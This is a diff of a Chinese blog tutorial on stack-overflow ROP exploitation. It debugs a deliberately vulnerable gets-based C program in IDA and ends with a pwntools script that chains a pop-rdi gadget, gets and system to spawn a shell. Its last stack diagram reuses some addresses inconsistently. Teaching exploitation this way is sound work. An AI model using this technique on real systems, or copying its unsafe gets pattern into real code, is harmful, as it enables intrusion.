@@ -59,22 +59,469 @@ lightGallery(document.getElementById('post-bg'), {
    }
  }
 });
-document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>栈溢出 - ROP (一)</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-08-15T15:06:15.007Z" id="date"> 2024-08-15</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-08-18T09:11:44.035Z" id="updated"> 2024-08-18</time></div></span></div></div><hr><div id="post-content"><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>栈溢出是一种允许攻击者向栈中写入过量数据的漏洞。</p>
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>栈溢出 - ROP (一)</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-08-15T15:06:15.007Z" id="date"> 2024-08-15</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-08-18T14:42:28.755Z" id="updated"> 2024-08-18</time></div></span></div></div><hr><div id="post-content"><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>栈溢出是一种允许攻击者向栈中写入过长数据的漏洞。</p>
 <p>ROP 是栈溢出的一种利于方式，攻击者对栈空间进行构造进而调用程序已有的指令片段进行攻击。</p>
 <p><mark>下面通过一个例题来进行讲解。</mark></p>
-<p>因为是入门第一篇文章，所以会讲的比较细。</p>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ol>
-<li><p>Linux x64</p>
-</li>
-<li><p>IDA (Linux x64)</p>
-<p>在官网下载后运行安装 (记住安装路径)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install libxcb-xinerama0<br><span class="hljs-built_in">cd</span> 安装路径<br>./ida64<br></code></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h3><p>题目代码：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];<br><br>__attribute__((<span class="hljs-built_in">visibility</span>(<span class="hljs-string">&quot;default&quot;</span>))) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MySystem</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyGets</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-type">char</span> str[<span class="hljs-number">10</span>];<br>	<span class="hljs-built_in">gets</span>(str);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>	<span class="hljs-built_in">MyGets</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>因为是入门第一篇文章，所以会讲的比较细。遇到不明白的继续往后看就清楚了。</p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>1.Linux x64</p>
+<p>2.IDA (Linux x64)</p>
+<p>在官网下载后运行安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">./idafree84_linux.run<br>apt-get install libxcb-xinerama0<br></code></pre></td></tr></table></figure>
+
+<h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>题目代码：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];<br><br>__attribute__((<span class="hljs-built_in">visibility</span>(<span class="hljs-string">&quot;default&quot;</span>))) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MySystem</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MyGets</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">10</span>];<br>    <span class="hljs-built_in">gets</span>(str);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-built_in">MyGets</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>生成可执行文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc pwn.c -o pwn -fno-stack-protector -no-pie -w<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc pwn.c -o pwn -fno-stack-protector -no-pie -w<br><span class="hljs-built_in">chmod</span> +x pwn<br></code></pre></td></tr></table></figure>
 
-<p>或者直接下载：</p>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/08/15/%E5%8F%8D%E5%B0%84%20DLL%20%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/">反射 DLL 加载器原理与实现 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Calico</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">例题分析</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
+<p>下载链接：<a target="_blank" rel="noopener" href="https://github.com/HackerCalico/Blog-Resource/raw/main/%E6%A0%88%E6%BA%A2%E5%87%BA%20-%20ROP%20(%E4%B8%80)">https://github.com/HackerCalico/Blog-Resource/raw/main/%E6%A0%88%E6%BA%A2%E5%87%BA%20-%20ROP%20(%E4%B8%80)</a></p>
+<p><mark>检查保护机制</mark></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt; checksec pwn<br>[*] <span class="hljs-string">&#x27;/root/Desktop/PWN/pwn&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)<br></code></pre></td></tr></table></figure>
+
+<p>未开启 Canary 栈保护，说明不会对向栈写入的数据长度进行检查。</p>
+<p>未开启 PIE 保护，说明加载到内存中的基址是固定的 (0x400000)，可以对变量、函数等地址进行预知。</p>
+<p><mark>使用 IDA 进行静态调试</mark></p>
+<p>通过终端启动 IDA，不要双击快捷方式，否则无法与程序进行控制台交互。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 安装路径<br>./ida64<br></code></pre></td></tr></table></figure>
+
+<p>shift + F7 进入 Segments 窗口。</p>
+<p class='item-img' data-src='https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/9.png'><img src="https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/9.png" alt="9.png"></p>
+<p>进入可写的 .bss 段 (存放未初始化的全局变量)，可以看到全局变量 buf 在内存中的绝对地址为 0x601060 (后面会用到)。</p>
+<p class='item-img' data-src='https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/10.png'><img src="https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/10.png" alt="9.png"></p>
+<p>到这里你可能会有疑问，如果启动多个未开启 PIE 保护的程序它们的绝对地址不会冲突吗？</p>
+<p>答案是系统会让它们运行在独立的虚拟空间。</p>
+<p><mark>使用 IDA 进行动态调试</mark></p>
+<p>在主函数 F12 设置一个软件断点，F9 运行。</p>
+<p class='item-img' data-src='https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/11.png'><img src="https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/11.png" alt="9.png"></p>
+<p>在下方 .text 段内的 0x4005E2 处可以发现 pop r15 &amp; retn (硬编码 41 5F C3)。</p>
+<p class='item-img' data-src='https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/12.png'><img src="https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/12.png" alt="9.png"></p>
+<p>我们可以断章取义将 0x4005E3 处的 5F C3 作为以下汇编指令使用 (后面会用到)。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">pop rdi<br>retn<br></code></pre></td></tr></table></figure>
+
+<p><mark>F8 单步到 call MyGets，下面开始分析该函数的漏洞。</mark></p>
+<p>在进入 MyGets 前，我们先观察一下：</p>
+<p>call MyGets 下一条指令的地址为 0x400579</p>
+<p class='item-img' data-src='https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/13.png'><img src="https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/13.png" alt="9.png"></p>
+<table>
+<thead>
+<tr>
+<th align="left">地址</th>
+<th align="left">栈</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x00007FFFFFFFDDE0</td>
+<td align="left"><mark>——————————————————————————————————————————</mark></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">寄存器</th>
+<th align="left">值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">RSP</td>
+<td align="left">0x00007FFFFFFFDDE0</td>
+</tr>
+<tr>
+<td align="left">RBP</td>
+<td align="left">0x00007FFFFFFFDDE0</td>
+</tr>
+</tbody></table>
+<p><mark>F7 步入 MyGets</mark></p>
+<p class='item-img' data-src='https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/14.png'><img src="https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/14.png" alt="9.png"></p>
+<p>call 指令使 0x400579 入栈，用于最终回到 call MyGets 下一行。并跳转到 MyGets 函数内。</p>
+<table>
+<thead>
+<tr>
+<th align="left">地址</th>
+<th align="left">栈</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left"><mark>0x400579</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDE0</td>
+<td align="left"><mark>——————————————————————————————————————————</mark></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">寄存器</th>
+<th align="left">值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">RSP</td>
+<td align="left"><mark>0x00007FFFFFFFDDD8</mark></td>
+</tr>
+<tr>
+<td align="left">RBP</td>
+<td align="left">0x00007FFFFFFFDDE0</td>
+</tr>
+</tbody></table>
+<p><mark>函数开头和结尾都会有平栈操作，保证调用函数前后栈顶、栈底不发生变化。</mark></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">push rbp<br>mov rbp, rsp<br>......<br>leave<br>retn<br></code></pre></td></tr></table></figure>
+
+<p>下面我们一点一点分析。</p>
+<p><mark>F8 单步两次</mark></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">push rbp<br>mov rbp, rsp<br></code></pre></td></tr></table></figure>
+
+<p>原本的栈底入栈，栈底上移与栈顶平齐，每个函数有自己的栈区域。</p>
+<p>当前栈底存储着原本的栈底，而当前栈底下面就是原本的栈顶。</p>
+<table>
+<thead>
+<tr>
+<th align="left">地址</th>
+<th align="left">栈</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left"><mark>0x00007FFFFFFFDDE0</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left">0x400579</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDE0</td>
+<td align="left">——————————————————————————————————————————</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">寄存器</th>
+<th align="left">值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">RSP</td>
+<td align="left"><mark>0x00007FFFFFFFDDD0</mark></td>
+</tr>
+<tr>
+<td align="left">RBP</td>
+<td align="left"><mark>0x00007FFFFFFFDDD0</mark></td>
+</tr>
+</tbody></table>
+<p><mark>F5 查看函数伪代码</mark></p>
+<p>结束了函数开头的平栈操作，现在要为 v1 局部变量分配 0x0A 大小的空间了，局部变量直接存储在栈上。</p>
+<p>gets 用于接收用户从控制台输入的数据存储到 v1。</p>
+<p>后面的注释表示 v1 的首地址为 RBP - 0x0A，往下看就知道了。</p>
+<p class='item-img' data-src='https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/15.png'><img src="https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/15.png" alt="9.png"></p>
+<p><mark>F8 单步四次</mark></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sub rsp, 10h<br>lea rax, [rbp - 0x0A]<br>mov rdi, rax<br>mov eax, 0x00<br></code></pre></td></tr></table></figure>
+
+<p>栈顶再次上移，给出了用于存储 v1 的空间。</p>
+<p>构造了 gets 的参数，将 RBP - 0x0A 这个地址存储在 RDI，告诉 gets 把数据存储在这里。</p>
+<table>
+<thead>
+<tr>
+<th align="left">地址</th>
+<th align="left">栈</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x00007FFFFFFFDDC0</td>
+<td align="left"><mark>——————————————————————————————————————————</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDC8</td>
+<td align="left"><mark>——————————————————————————————————————————</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left"><mark>0x00007FFFFFFFDDE0</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left">0x400579</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDE0</td>
+<td align="left">——————————————————————————————————————————</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">寄存器</th>
+<th align="left">值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">RSP</td>
+<td align="left"><mark>0x00007FFFFFFFDDC0</mark></td>
+</tr>
+<tr>
+<td align="left">RBP</td>
+<td align="left">0x00007FFFFFFFDDD0</td>
+</tr>
+<tr>
+<td align="left">RDI</td>
+<td align="left"><mark>0x00007FFFFFFFDDC6</mark></td>
+</tr>
+</tbody></table>
+<p><mark>F8 单步调用 gets，输入 9 个 1</mark></p>
+<p>可以看到我们输入的 111111111\0 从 0x00007FFFFFFFDDC6 填满了 v1。</p>
+<table>
+<thead>
+<tr>
+<th align="left">地址</th>
+<th align="left">栈</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x00007FFFFFFFDDC0</td>
+<td align="left"><mark>3131000000000000</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDC8</td>
+<td align="left"><mark>0031313131313131</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left"><mark>0x00007FFFFFFFDDE0</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left">0x400579</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDE0</td>
+<td align="left">——————————————————————————————————————————</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">寄存器</th>
+<th align="left">值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">RSP</td>
+<td align="left">0x00007FFFFFFFDDC0</td>
+</tr>
+<tr>
+<td align="left">RBP</td>
+<td align="left">0x00007FFFFFFFDDD0</td>
+</tr>
+</tbody></table>
+<p><mark>F8 单步一次</mark></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">leave<br></code></pre></td></tr></table></figure>
+
+<p>结尾的平栈操作，发现栈区域回到了下面，这都要归功于栈底存储了之前栈底的地址。</p>
+<table>
+<thead>
+<tr>
+<th align="left">地址</th>
+<th align="left">栈</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x00007FFFFFFFDDC0</td>
+<td align="left">3131000000000000</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDC8</td>
+<td align="left">0031313131313131</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left">0x00007FFFFFFFDDE0</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left"><mark>0x400579</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDE0</td>
+<td align="left"><mark>——————————————————————————————————————————</mark></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">寄存器</th>
+<th align="left">值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">RSP</td>
+<td align="left"><mark>0x00007FFFFFFFDDD8</mark></td>
+</tr>
+<tr>
+<td align="left">RBP</td>
+<td align="left"><mark>0x00007FFFFFFFDDE0</mark></td>
+</tr>
+</tbody></table>
+<p><mark>F8 单步一次</mark></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">retn<br></code></pre></td></tr></table></figure>
+
+<p>发现栈顶下移，栈区域回到了调用 call MyGets 前的原位，并且执行地址来到了 call MyGets 的下一行，这都要归功于栈顶存储了下一行地址。</p>
+<p class='item-img' data-src='https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/16.png'><img src="https://raw.githubusercontent.com/HackerCalico/Blog-Resource/main/16.png" alt="9.png"></p>
+<table>
+<thead>
+<tr>
+<th align="left">地址</th>
+<th align="left">栈</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x00007FFFFFFFDDC0</td>
+<td align="left">3131000000000000</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDC8</td>
+<td align="left">0031313131313131</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left">0x00007FFFFFFFDDE0</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left">0x400579</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDE0</td>
+<td align="left"><mark>——————————————————————————————————————————</mark></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="left">寄存器</th>
+<th align="left">值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">RSP</td>
+<td align="left"><mark>0x00007FFFFFFFDDE0</mark></td>
+</tr>
+<tr>
+<td align="left">RBP</td>
+<td align="left">0x00007FFFFFFFDDE0</td>
+</tr>
+</tbody></table>
+<h3 id="ROP-分析"><a href="#ROP-分析" class="headerlink" title="ROP 分析"></a>ROP 分析</h3><p>经过上面的调试分析，我们可以得到以下结论：</p>
+<p>(1) 函数最终 retn 返回的地址</p>
+<p><u>就是刚步入函数时，栈顶存储的地址；</u></p>
+<p><u>也是栈底上移后，栈底下方 (RBP + 8) 存储的地址；</u></p>
+<p><u>也是执行 retn 前栈顶存储的地址。</u></p>
+<p>(2) v1 存储的数据的首地址为 RBP - 0x0A。</p>
+<p>(3) 只要向 v1 写入长度 0x0A + 8 + 8 的数据 <u>(栈底下方 (RBP + 8) 存储的地址)</u>，就可以将 retn 返回劫持到自己想执行的地址。</p>
+<table>
+<thead>
+<tr>
+<th align="left">正常</th>
+<th align="left"></th>
+<th align="left">劫持</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">地址</td>
+<td align="left">栈</td>
+<td align="left">地址</td>
+<td>栈</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDC0</td>
+<td align="left"><mark>3131000000000000</mark></td>
+<td align="left">0x00007FFFFFFFDDC0</td>
+<td><mark>3131000000000000</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDC8</td>
+<td align="left"><mark>0031313131313131</mark></td>
+<td align="left">0x00007FFFFFFFDDC8</td>
+<td><mark>3131313131313131</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left"><mark>0x00007FFFFFFFDDE0</mark></td>
+<td align="left">0x00007FFFFFFFDDD0</td>
+<td><mark>3131313131313131</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left">0x400579</td>
+<td align="left">0x00007FFFFFFFDDD8</td>
+<td>3131313131313131</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDE0</td>
+<td align="left">—————————————————————</td>
+<td align="left">0x00007FFFFFFFDDE0</td>
+<td>—————————————————————</td>
+</tr>
+</tbody></table>
+<p>如果开启了 Canary 栈保护，v1 下面会插入一个随机值，retn 前会检查随机值是否被覆盖。</p>
+<p><mark>构造 ROP 链</mark></p>
+<p>很容易想到可以劫持到 system 来命令执行，所以我们要先劫持到 gets 来接收我们想执行的命令。</p>
+<p>我们要探究 gets、system 被正常调用时寄存器和栈的状态，进而通过栈溢出构造出来。</p>
+<p>gets 和 system 都是只有一个参数的函数。在调用 gets 时，从上面就可以看到接收数据的地址要存储在 RDI。在调用 system 时，要执行的命令的地址要存储在 RDI。规律是随着函数参数的增多，参数会倒序依次存储在 RDI、RSI、RDX、RCX、R8、R9、栈。</p>
+<p>前面提到的全局变量 buf 的地址为 0x601060，可以用于存储要执行的命令。我们要想办法让 0x601060 出现在 RDI 中，再进入 gets。</p>
+<p>前面提到的 pop rdi &amp; retn 的地址为 0x4005E3，我们只要将栈构造为以下状态，就可以成功调用 gets 和 system，可以认真思考一下。</p>
+<table>
+<thead>
+<tr>
+<th align="left">地址</th>
+<th align="left">栈</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">0x00007FFFFFFFDDC0</td>
+<td align="left"><mark>3131000000000000</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDC8</td>
+<td align="left"><mark>3131313131313131</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left"><mark>3131313131313131</mark></td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left">0x4005E3 pop rdi &amp; retn</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDE0</td>
+<td align="left">0x601060 buf</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left">gets 地址</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left">0x4005E3 pop rdi &amp; retn</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDC8</td>
+<td align="left">0x601060 buf</td>
+</tr>
+<tr>
+<td align="left">0x00007FFFFFFFDDC0</td>
+<td align="left">system 地址</td>
+</tr>
+</tbody></table>
+<p>MyGets 函数 retn 返回到 pop RDI，栈顶下移至 0x601060 buf。</p>
+<p>pop RDI 将栈顶 buf 地址存入 RDI，栈顶下移至 gets 地址。</p>
+<p>retn 进入 gets <u>(执行 retn 前栈顶存储的地址)</u>，输入命令存储到 buf，栈顶下移至 0x4005E3 pop rdi &amp; retn。</p>
+<p>gets 结束 retn 返回到 pop RDI <u>(刚步入函数时，栈顶存储的地址)</u>，栈顶下移至 0x601060 buf。</p>
+<p>pop RDI 使栈顶 buf 地址存入 RDI，栈顶下移至 system 地址。</p>
+<p>retn 进入 system <u>(执行 retn 前栈顶存储的地址)</u>，执行存储在 buf 的命令，栈顶下移。</p>
+<p><mark>编写 EXP</mark></p>
+<p>地址能够预知归功于未开启 PIE 保护。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>buf = <span class="hljs-number">0x601060</span><br>gets = elf.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]<br>system = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>pop_rdi_retn = <span class="hljs-number">0x4005E3</span><br>payload = cyclic(<span class="hljs-number">0x0A</span> + <span class="hljs-number">8</span>) + p64(pop_rdi_retn) + p64(buf) + p64(gets) + p64(pop_rdi_retn) + p64(buf) + p64(system)<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>io.sendline(payload) <br>io.sendline(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>io.recv()<br>io.interactive()<br></code></pre></td></tr></table></figure>
